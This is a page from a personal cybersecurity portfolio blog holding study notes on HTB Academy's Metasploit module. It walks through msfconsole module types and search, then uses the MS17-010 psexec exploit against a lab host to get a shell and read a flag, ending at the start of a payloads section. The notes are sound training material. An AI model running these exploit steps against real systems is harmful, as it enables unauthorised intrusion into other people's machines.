@@ -1,0 +1,658 @@
+<!DOCTYPE html><html lang="en"> <head><style is:global>
+  :root {
+    --accent-color: #60a5fa;
+    --accent-light: rgba(193, 219, 251, 0.1);
+    --accent-dark: rgba(251, 121, 117, 1);
+    --accent-link: #bbff7cff;
+    --accent-number: #ffc36aff;
+    --bg-primary: #0a0a0a;
+    --bg-secondary: #1a1a1a;
+    --bg-secondary-translucent: rgba(26, 26, 26, 0.75);
+    --bg-code: #000000;
+    --bg-code-border: rgba(96, 165, 250, 0.2);
+    --text-primary: #e5e5e5;
+    --text-secondary: #a3a3a3;
+    --text-code: #d4d4d4;
+    --border-primary: #60a5fa;
+    --border-code: #60a5fa;
+  }
+</style><meta charset="utf-8"><script type="module" src="/cyberportfolio/_astro/_slug_.astro_astro_type_script_index_0_lang.DL7JLXz2.js"></script><script type="module" src="/cyberportfolio/_astro/_slug_.astro_astro_type_script_index_1_lang.5d8QzmEz.js"></script><script type="module" src="/cyberportfolio/_astro/_slug_.astro_astro_type_script_index_2_lang.T3-5GIcd.js"></script><script type="module" src="/cyberportfolio/_astro/_slug_.astro_astro_type_script_index_3_lang.B-GXHydZ.js"></script><link rel="icon" type="image/x-icon" href="/cyberportfolio/favicon.ico"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.16.6"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet"><title>Using the Metasploit Framework - HTB Academy</title><style>html{scroll-behavior:smooth}#header[data-astro-cid-3ef6ksr2]{transform:translateY(0)}
+.disclaimer-box[data-astro-cid-cukr4w5s]{display:flex;gap:.75rem;padding:1rem;border-radius:.5rem;background-color:#f59e0b14;border:1px solid rgba(245,158,11,.3);border-left:4px solid rgba(245,158,11,.6);color:var(--text-primary);font-size:.875rem;line-height:1.5}.disclaimer-icon[data-astro-cid-cukr4w5s]{flex:0 0 1.25rem;display:flex;align-items:flex-start;justify-content:center;color:#f59e0b;margin-top:.125rem}.disclaimer-icon-mark[data-astro-cid-cukr4w5s]{width:1.25rem;height:1.25rem;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:1.05rem;line-height:1}.disclaimer-content[data-astro-cid-cukr4w5s]{flex:1}.disclaimer-title[data-astro-cid-cukr4w5s]{margin:0 0 .25rem;font-weight:600;font-size:.875rem;color:var(--text-primary)}.disclaimer-text[data-astro-cid-cukr4w5s]{margin:0;color:var(--text-secondary);font-size:.8rem}@media(prefers-color-scheme:dark){.disclaimer-box[data-astro-cid-cukr4w5s]{background-color:#f59e0b1f;border-color:#f59e0b66;border-left-color:#f59e0bb3}.disclaimer-icon[data-astro-cid-cukr4w5s]{color:#fbbf24}}.tag-link:hover,#backToTop:hover{transform:translateY(-2px);filter:brightness(1.1)}#sidebarChevron,#tocChevron{transition:transform .3s ease}#sidebarTOC a,#mobileTOC a{display:block;padding:.25rem;border-radius:4px;text-decoration:none;color:var(--text-secondary)}#sidebarTOC a:hover,#mobileTOC a:hover{color:var(--accent-link);background:#00000008}#sidebarTOC{scrollbar-width:thin;scrollbar-color:var(--accent-light) transparent;padding-right:.5rem}#sidebarTOC::-webkit-scrollbar{width:8px}#sidebarTOC::-webkit-scrollbar-track{background:transparent}#sidebarTOC::-webkit-scrollbar-thumb{background-color:var(--accent-light);border-radius:4px;border:2px solid transparent;background-clip:padding-box}#sidebarTOC::-webkit-scrollbar-thumb:hover{background-color:var(--accent-color)}
+</style>
+<link rel="stylesheet" href="/cyberportfolio/_astro/blog.CBlC4rlS.css"></head> <body class="flex flex-col min-h-screen"> <header id="header" class="fixed top-0 left-0 right-0 z-50 transition-all duration-300 backdrop-blur-sm" style="background-color: var(--bg-secondary-translucent)" data-astro-cid-3ef6ksr2> <nav class="max-w-7xl mx-auto px-4 py-3 md:px-6 md:py-4" data-astro-cid-3ef6ksr2> <ul class="flex items-center gap-3 md:gap-8 justify-center text-xs md:text-base flex-wrap" data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2><a href="/cyberportfolio" class="font-medium text-[var(--text-primary)] hover:text-[var(--accent-color)] transition-colors" data-astro-cid-3ef6ksr2>Home</a></li> <li data-astro-cid-3ef6ksr2><a href="/cyberportfolio/ctf-writeups" class="font-medium text-[var(--text-primary)] hover:text-[var(--accent-color)] transition-colors" data-astro-cid-3ef6ksr2>CTFs</a></li> <li data-astro-cid-3ef6ksr2><a href="/cyberportfolio/blog" class="font-medium text-[var(--text-primary)] hover:text-[var(--accent-color)] transition-colors" data-astro-cid-3ef6ksr2>Blog</a></li>  <li data-astro-cid-3ef6ksr2><a href="/cyberportfolio/#about" class="font-medium text-[var(--text-primary)] hover:text-[var(--accent-color)] transition-colors" data-astro-cid-3ef6ksr2>About</a></li>  <li data-astro-cid-3ef6ksr2><a href="/cyberportfolio/reviews" class="font-medium text-[var(--text-primary)] hover:text-[var(--accent-color)] transition-colors" data-astro-cid-3ef6ksr2>Reviews</a></li> </ul> </nav> <section class="max-w-4xl mx-auto px-4 py-1 md:py-3" data-astro-cid-3ef6ksr2> <div class="mb-8 relative"> <form id="searchForm" class="w-full"> <input type="text" id="globalSearch" name="q" placeholder="Search posts, writeups, reviews, tags..." class="w-full px-4 py-2 rounded-lg focus:outline-none focus:ring-2" style="border: 1px solid var(--border-primary); background-color: var(--bg-secondary-translucent); color: var(--text-primary); backdrop-filter: blur(8px);"> </form> <div id="searchResults" class="mt-2 hidden absolute rounded-lg shadow-lg w-full z-50 max-h-96 overflow-y-auto" style="background-color: var(--bg-secondary); border: 1px solid var(--border-primary);"></div> </div> <script>(function(){const searchIndex = [{"type":"post","title":"Welcome to My Website!","description":"Site overview and navigation guide","tags":["intro-blog","guide"],"url":"/cyberportfolio/blog/2025-12-10-welcome/","date":"2025-12-10T00:00:00.000Z"},{"type":"post","title":"JavaScript Deobfuscation - HTB Academy","description":"basics of deobfuscation and decoding JavaScript code","tags":["basics","htb-academy","javascript","web-exploit","obfuscation","encode","decode","cipher"],"url":"/cyberportfolio/blog/2025-12-18-javascript-deob/","date":"2025-12-18T00:00:00.000Z"},{"type":"post","title":"Attacking Web Applications With Ffuf - HTB Academy","description":"my notes for ffuf htb academy","tags":["basics","web-exploit","ffuf","fuzzing","directory","htb-academy","learn","dns"],"url":"/cyberportfolio/blog/2025-12-15-awawfuff/","date":"2025-12-15T00:00:00.000Z"},{"type":"post","title":"Network Enumeration with Nmap - HTB Academy","description":"notes for nmap enumeration","tags":["htb-academy","enumeration","nmap","basics","firewall"],"url":"/cyberportfolio/blog/2025-12-17-htb-nmap/","date":"2025-12-17T00:00:00.000Z"},{"type":"post","title":"Using the Metasploit Framework - HTB Academy","description":"metasploit","tags":["htb-academy","basics","metasploit","firewall","apache","msfvenom","firewall-evasion","priv-escalation"],"url":"/cyberportfolio/blog/2025-12-24-msf/","date":"2025-12-24T00:00:00.000Z"},{"type":"writeup","title":"Cornfield Chase","description":"geoguessr","tags":["niteCTF","osint","taiwan","power pole","easy"],"url":"/cyberportfolio/ctf-writeups/2025-12-13-cornfield/","date":"2025-12-13T00:00:00.000Z"},{"type":"writeup","title":"Eazy Network Analysis","description":"Writeup for Eazy Network Analysis from BrainHack 2023","tags":["wireshark","network","medium","brainhack"],"url":"/cyberportfolio/ctf-writeups/2025-12-30-brainhack-2023-eazy-network-analysis/","date":"2025-12-30T00:00:00.000Z"},{"type":"writeup","title":"CTF Collection","description":"CTF writeups collection and navigation guide","tags":["intro","guide"],"url":"/cyberportfolio/ctf-writeups/2025-12-10-ctf-collection/","date":"2025-12-10T00:00:00.000Z"},{"type":"writeup","title":"Crack the Gate 1","description":"Writeup for Crack the Gate 1 from picoCTF","tags":["web-exploit","easy","picoCTF"],"url":"/cyberportfolio/ctf-writeups/2025-12-24-picoctf-crack-the-gate-1/","date":"2025-12-24T00:00:00.000Z"},{"type":"writeup","title":"Permissions","description":"linux priv escalation chal","tags":["linux","priv-escalation","picoCTF"],"url":"/cyberportfolio/ctf-writeups/2025-12-24-perms/","date":"2025-12-24T00:00:00.000Z"},{"type":"writeup","title":"OverTheWire - Bandit","description":"All level solutions","tags":["linux","general","basics","OTW","easy","walkthrough","collection"],"url":"/cyberportfolio/ctf-writeups/2024-03-10-bandit/","date":"2024-03-10T00:00:00.000Z"},{"type":"review","title":"SC2001 - Algorithm Design and Analysis","description":"greedy, dp and other graph algorithms","tags":["algorithms","python","dp","sc2001"],"category":"module","moduleCode":"SC2001","url":"/cyberportfolio/reviews/2025-12-24-data-structures-and-algorithms/","date":"2025-12-24T00:00:00.000Z"}];
+
+  const searchInput = document.getElementById('globalSearch');
+  const searchForm = document.getElementById('searchForm');
+  const resultsContainer = document.getElementById('searchResults');
+
+  // HTML escape function to prevent XSS
+  function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+  }
+
+  // Handle form submission (Enter key)
+  searchForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const query = searchInput.value.trim();
+    if (query) {
+      window.location.href = `/cyberportfolio/search?q=${encodeURIComponent(query)}`;
+    }
+  });
+
+  searchInput.addEventListener('input', (e) => {
+    const query = e.target.value.toLowerCase().trim();
+
+    if (query.length === 0) {
+      resultsContainer.classList.add('hidden');
+      return;
+    }
+
+    const results = searchIndex.filter(item => {
+      const titleMatch = item.title.toLowerCase().includes(query);
+      const descriptionMatch = item.description.toLowerCase().includes(query);
+      const tagsMatch = item.tags.some(tag => tag.toLowerCase().includes(query));
+
+      return titleMatch || descriptionMatch || tagsMatch;
+    });
+
+    if (results.length === 0) {
+      resultsContainer.textContent = 'No results found. Press Enter to see all results.';
+      resultsContainer.className = 'mt-2 absolute rounded-lg shadow-lg w-full z-50 max-h-96 overflow-y-auto p-4';
+      resultsContainer.style.cssText = 'background-color: var(--bg-secondary); border: 1px solid var(--border-primary); color: var(--text-secondary);';
+      return;
+    }
+
+    // Clear and build results using DOM methods instead of innerHTML
+    resultsContainer.innerHTML = '';
+    resultsContainer.className = 'mt-2 absolute rounded-lg shadow-lg w-full z-50 max-h-96 overflow-y-auto';
+    resultsContainer.style.cssText = 'background-color: var(--bg-secondary); border: 1px solid var(--border-primary);';
+
+    results.slice(0, 8).forEach(item => {
+      const link = document.createElement('a');
+      link.href = item.url;
+      link.className = 'block p-4 transition-colors';
+      link.style.cssText = 'border-bottom: 1px solid var(--border-primary);';
+      link.onmouseover = () => link.style.backgroundColor = 'var(--accent-light)';
+      link.onmouseout = () => link.style.backgroundColor = 'transparent';
+
+      const header = document.createElement('div');
+      header.className = 'flex items-center justify-between';
+      
+      const typeSpan = document.createElement('span');
+      typeSpan.className = 'text-xs font-semibold uppercase';
+      typeSpan.style.cssText = 'color: var(--accent-color);';
+      typeSpan.textContent = item.type;
+      header.appendChild(typeSpan);
+
+      if (item.date) {
+        const dateSpan = document.createElement('span');
+        dateSpan.className = 'text-xs';
+        dateSpan.style.cssText = 'color: var(--text-secondary);';
+        dateSpan.textContent = new Date(item.date).toLocaleDateString();
+        header.appendChild(dateSpan);
+      }
+
+      const title = document.createElement('h3');
+      title.className = 'font-semibold mt-1';
+      title.style.cssText = 'color: var(--text-primary);';
+      title.textContent = item.title;
+
+      link.appendChild(header);
+      link.appendChild(title);
+
+      if (item.description) {
+        const desc = document.createElement('p');
+        desc.className = 'text-sm mt-1';
+        desc.style.cssText = 'color: var(--text-secondary);';
+        desc.textContent = item.description.substring(0, 100) + '...';
+        link.appendChild(desc);
+      }
+
+      if (item.tags.length > 0) {
+        const tagsDiv = document.createElement('div');
+        tagsDiv.className = 'flex gap-2 mt-2 flex-wrap';
+        item.tags.slice(0, 3).forEach(tag => {
+          const tagSpan = document.createElement('span');
+          tagSpan.className = 'text-xs px-2 py-1 rounded';
+          tagSpan.style.cssText = 'background-color: var(--accent-light); color: var(--text-primary);';
+          tagSpan.textContent = tag;
+          tagsDiv.appendChild(tagSpan);
+        });
+        link.appendChild(tagsDiv);
+      }
+
+      resultsContainer.appendChild(link);
+    });
+
+    // Add footer
+    const footer = document.createElement('div');
+    footer.className = 'p-2 text-center text-xs';
+    footer.style.cssText = 'color: var(--text-secondary); border-top: 1px solid var(--border-primary);';
+    footer.textContent = 'Press Enter to see all results';
+    resultsContainer.appendChild(footer);
+
+    resultsContainer.classList.remove('hidden');
+  });
+
+  // Close results when clicking outside
+  document.addEventListener('click', (e) => {
+    if (!e.target.closest('#globalSearch') && !e.target.closest('#searchResults')) {
+      resultsContainer.classList.add('hidden');
+    }
+  });
+})();</script> </section> </header> <script type="module">const t=document.getElementById("header"),n=document.getElementById("globalSearch");let r=0;window.addEventListener("scroll",()=>{const e=window.scrollY;e>r&&e>100?document.activeElement!==n&&(t.style.transform="translateY(-100%)"):t.style.transform="translateY(0)",r=e});n&&(n.addEventListener("focus",()=>{t.style.transform="translateY(0)"}),n.addEventListener("blur",()=>{window.scrollY>100&&(t.style.transform="translateY(-100%)")}));document.addEventListener("click",e=>{const l=e.target;t&&!t.contains(l)&&window.scrollY>100&&(t.style.transform="translateY(-100%)")});t&&t.addEventListener("click",e=>{e.stopPropagation(),t.style.transform="translateY(0)"});</script>  <main class="flex-1 w-full px-4 py-10 pt-40"> <div class="max-w-7xl mx-auto"> <a href="/cyberportfolio/blog" class="inline-flex items-center mb-6 text-[var(--accent-color)] hover:text-[var(--accent-dark)]"> <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path> </svg>
+Back to Blog
+</a> <div class="flex gap-8 lg:gap-12 relative"> <!-- Sticky Sidebar (Desktop) --> <aside class="hidden lg:block w-48 flex-shrink-0"> <div class="sticky top-15 space-y-4 max-h-[calc(100vh-5rem)] overflow-hidden flex flex-col"> <!-- Back to Top Button --> <button id="backToTop" class="flex items-center gap-2 text-sm font-medium transition-all w-full px-3 py-2 rounded-md hover:shadow-md flex-shrink-0" style="background-color: var(--accent-light); color: var(--text-primary);"> <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path> </svg>
+Back to Top
+</button> <!-- Tags Section (only show if tags exist) --> <div class="flex-shrink-0"> <button id="sidebarToggle" class="flex items-center gap-2 text-sm font-semibold mb-3 transition-colors w-full" style="color: var(--accent-color);"> <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z"></path> </svg> <span id="sidebarToggleText">Tags (8)</span> <svg id="sidebarChevron" class="w-4 h-4 ml-auto transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path> </svg> </button> <div id="sidebarTags" class="flex flex-col gap-2"> <a href="/cyberportfolio/search?q=htb-academy" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> htb-academy </a><a href="/cyberportfolio/search?q=basics" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> basics </a><a href="/cyberportfolio/search?q=metasploit" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> metasploit </a><a href="/cyberportfolio/search?q=firewall" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> firewall </a><a href="/cyberportfolio/search?q=apache" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> apache </a><a href="/cyberportfolio/search?q=msfvenom" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> msfvenom </a><a href="/cyberportfolio/search?q=firewall-evasion" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> firewall-evasion </a><a href="/cyberportfolio/search?q=priv-escalation" class="tag-link px-3 py-1.5 text-sm rounded-md transition-all text-center" style="background-color: var(--accent-light); color: var(--text-primary);"> priv-escalation </a> </div> </div> <!-- Table of Contents Toggle (Desktop) --> <button id="tocToggle" class="flex items-center gap-2 text-sm font-semibold mb-3 transition-colors w-full flex-shrink-0" style="color: var(--accent-color);"> <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path> </svg> <span id="tocToggleText">Contents</span> <svg id="tocChevron" class="w-4 h-4 ml-auto transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path> </svg> </button> <div id="sidebarTOC" class="flex flex-col gap-2 overflow-y-auto pr-2 flex-1 min-h-0"></div> </div> </aside> <!-- Main Article Content + Right Sidebar --> <div class="article-and-sidebar"> <!-- Article --> <article class="flex-1 min-w-0 max-w-4xl"> <h1 class="text-4xl font-bold mb-2 text-[var(--text-primary)]">Using the Metasploit Framework - HTB Academy</h1> <div class="text-sm mb-4 text-[var(--text-secondary)]"> <p>
+Published: December 24, 2025 </p>  </div>  <div class="mb-6 lg:hidden"> <button id="mobileToggle" class="flex items-center gap-2 text-sm font-medium transition-colors" style="color: var(--accent-color);"> <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z"></path> </svg> <span id="mobileToggleText">Show Tags (8)</span> </button> <div id="mobileTags" class="hidden mt-3 flex flex-wrap gap-2"> <a href="/cyberportfolio/search?q=htb-academy" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> htb-academy </a><a href="/cyberportfolio/search?q=basics" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> basics </a><a href="/cyberportfolio/search?q=metasploit" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> metasploit </a><a href="/cyberportfolio/search?q=firewall" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> firewall </a><a href="/cyberportfolio/search?q=apache" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> apache </a><a href="/cyberportfolio/search?q=msfvenom" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> msfvenom </a><a href="/cyberportfolio/search?q=firewall-evasion" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> firewall-evasion </a><a href="/cyberportfolio/search?q=priv-escalation" class="tag-link px-3 py-1.5 text-sm rounded-full transition-all hover:shadow-md" style="background-color: var(--accent-light); color: var(--text-primary);"> priv-escalation </a> </div> </div> <!-- Mobile TOC Toggle (always available on small screens) --><div class="mb-6 lg:hidden"> <button id="mobileTOCToggle" class="flex items-center gap-2 text-sm font-medium transition-colors mb-3" style="color: var(--accent-color);"> <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path> </svg> <span id="mobileTOCToggleText">Show Contents</span> </button> <div id="mobileTOC" class="hidden mt-3 flex flex-col gap-2"></div> </div> <div class="prose max-w-none"> <p>Download MSF cheatsheet <a href="https://academy.hackthebox.com/module/cheatsheet/39">here</a></p>
+<p>Knowing our tools inside and out is important to keep our tracks covered. Many tools are unpredictable. They can leave traces of activity on the target system , and some may leave our attacker platform with open gates.</p>
+<p><code>Metasploit Project</code> is a modular penetration testing platform that enables you to write, test, and execute code.</p>
+<p><img alt="msf1" loading="lazy" decoding="async" fetchpriority="auto" width="2526" height="784" src="/cyberportfolio/_astro/msf1.CvtNYhJf_sve1D.webp" ></p>
+<p>We will be using Metasploit for:</p>
+<ol>
+<li>Enumeration</li>
+<li>Preparation</li>
+<li>Exploitation</li>
+<li>Privilege Escalation</li>
+<li>Post-Exploitation</li>
+</ol>
+<p><img alt="msf2" loading="lazy" decoding="async" fetchpriority="auto" width="2760" height="5176" src="/cyberportfolio/_astro/msf2.COTUfjDI_ZtxtFs.webp" ></p>
+<h2 id="modules">Modules</h2>
+<p><code>modules</code> are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.</p>
+<p>Select a module</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">No.</span><span style="color:#F97583">></span><span style="color:#F97583"> &#x3C;</span><span style="color:#E1E4E8">type</span><span style="color:#F97583">></span><span style="color:#E1E4E8">/</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">os</span><span style="color:#F97583">></span><span style="color:#E1E4E8">/</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">service</span><span style="color:#F97583">></span><span style="color:#E1E4E8">/</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">name</span><span style="color:#F97583">></span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">794</span><span style="color:#9ECBFF">   exploit/windows/ftp/scriptftp_list</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Type</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td></tr><tr><td><code>Encoders</code></td><td>Ensure that payloads are intact to their destination.</td></tr><tr><td><code>Exploits</code></td><td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td></tr><tr><td><code>NOPs</code></td><td>(No Operation code) Keep the payload sizes consistent across exploit attempts.</td></tr><tr><td><code>Payloads</code></td><td>Code runs remotely and calls back to the attacker machine to establish a connection (or shell).</td></tr><tr><td><code>Plugins</code></td><td>Additional scripts can be integrated within an assessment with <code>msfconsole</code> and coexist.</td></tr><tr><td><code>Post</code></td><td>Wide array of modules to gather information, pivot deeper, etc.</td></tr></tbody></table>
+<p>Note that when selecting a module to use for payload delivery, the <code>use &#x3C;no.></code> command can only be used with the following modules that can be used as <code>initiators</code> (or interactable modules):</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Type</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td></tr><tr><td><code>Exploits</code></td><td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td></tr><tr><td><code>Post</code></td><td>Wide array of modules to gather information, pivot deeper, etc.</td></tr><tr><td>Searching for modules</td><td></td></tr></tbody></table>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">search</span><span style="color:#9ECBFF"> type:exploit</span><span style="color:#9ECBFF"> platform:windows</span><span style="color:#9ECBFF"> cve:2021</span><span style="color:#9ECBFF"> rank:excellent</span><span style="color:#9ECBFF"> microsoft</span></span></code></pre>
+<p>Using modules</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">SNIP</span><span style="color:#F97583">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">Matching</span><span style="color:#9ECBFF"> Modules</span></span>
+<span class="line"><span style="color:#9ECBFF">================</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">   #  Name                                  Disclosure Date  Rank    Check  Description</span></span>
+<span class="line"><span style="color:#B392F0">   -</span><span style="color:#79B8FF">  ----</span><span style="color:#79B8FF">                                  ---------------</span><span style="color:#79B8FF">  ----</span><span style="color:#79B8FF">    -----</span><span style="color:#79B8FF">  -----------</span></span>
+<span class="line"><span style="color:#B392F0">   0</span><span style="color:#9ECBFF">  exploit/windows/smb/ms17_010_psexec</span><span style="color:#9ECBFF">   2017-03-14</span><span style="color:#9ECBFF">       normal</span><span style="color:#9ECBFF">  Yes</span><span style="color:#9ECBFF">    MS17-010</span><span style="color:#9ECBFF"> EternalRomance/EternalSynergy/EternalChampion</span><span style="color:#9ECBFF"> SMB</span><span style="color:#9ECBFF"> Remote</span><span style="color:#9ECBFF"> Windows</span><span style="color:#9ECBFF"> Code</span><span style="color:#9ECBFF"> Execution</span></span>
+<span class="line"><span style="color:#B392F0">   1</span><span style="color:#9ECBFF">  auxiliary/admin/smb/ms17_010_command</span><span style="color:#9ECBFF">  2017-03-14</span><span style="color:#9ECBFF">       normal</span><span style="color:#9ECBFF">  No</span><span style="color:#9ECBFF">     MS17-010</span><span style="color:#9ECBFF"> EternalRomance/EternalSynergy/EternalChampion</span><span style="color:#9ECBFF"> SMB</span><span style="color:#9ECBFF"> Remote</span><span style="color:#9ECBFF"> Windows</span><span style="color:#9ECBFF"> Command</span><span style="color:#9ECBFF"> Execution</span></span>
+<span class="line"><span style="color:#E1E4E8">   </span></span>
+<span class="line"><span style="color:#E1E4E8">   </span></span>
+<span class="line"><span style="color:#B392F0">msf6</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> use</span><span style="color:#79B8FF"> 0</span></span>
+<span class="line"><span style="color:#B392F0">msf6</span><span style="color:#9ECBFF"> exploit</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">windows/smb/ms17_010_psexec</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">></span><span style="color:#9ECBFF"> options</span></span></code></pre>
+<p>Specify target</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> RHOSTS</span><span style="color:#79B8FF"> 10.10.10.40</span></span></code></pre>
+<p><code>setg</code> - set permanent options until restart</p>
+<p>Setting LHOST: set to own IP</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">setg</span><span style="color:#9ECBFF"> LHOST</span><span style="color:#79B8FF"> 10.10.14.15</span></span></code></pre>
+<p>Execute exploit</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">run</span></span></code></pre>
+<p><strong>SMB</strong> service is a network protocol that lets computers share files, printers and other resources.</p>
+<ol>
+<li><code>nmap</code> the target</li>
+<li>SMB service is running on port 445</li>
+<li>good habit to <strong>always run auxiliary scanners before exploits</strong></li>
+</ol>
+<div class="callout callout-green callout-collapsible" data-expanded="false">
+  <div class="callout-title">
+    <span class="callout-icon">💡</span>
+    <span class="callout-title-text">common sense to</span>
+    <svg class="callout-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polyline points="6 9 12 15 18 9"></polyline>
+    </svg>
+  </div>
+  <div class="callout-content">
+<p><strong>verify</strong> a vulnerability exists before running the exploit</p>
+</div></div>
+<ol start="4">
+<li><code>search ms17_010</code> for eternal romance</li>
+<li>select exploit (because we want to get access to shell)</li>
+<li>set RHOST, LHOST</li>
+<li>execute <code>run</code></li>
+<li>type <code>shell</code></li>
+<li><code>cd C:\Users\Administrator\Desktop</code></li>
+<li><code>type flag.txt</code></li>
+</ol>
+<h2 id="targets">Targets</h2>
+<p><code>show targets</code> <strong>within exploit module</strong> will display all available vulnerable targets for a specific exploit</p>
+<p><code>show targets</code> outside exploit module will let us know that we need to select an exploit module first</p>
+<p>Selecting a target</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> target</span><span style="color:#79B8FF"> 11</span></span></code></pre>
+<p>To identify a target correct, we need to:</p>
+<ul>
+<li>obtain a copy of the target binaries</li>
+<li>use <code>msfpescan</code> to locate a suitable return address</li>
+</ul>
+<h2 id="payloads">Payloads</h2>
+<p>A payload is Metasploit refers to a module that aids the exploit module in returning a <strong>shell</strong> to the attacker</p>
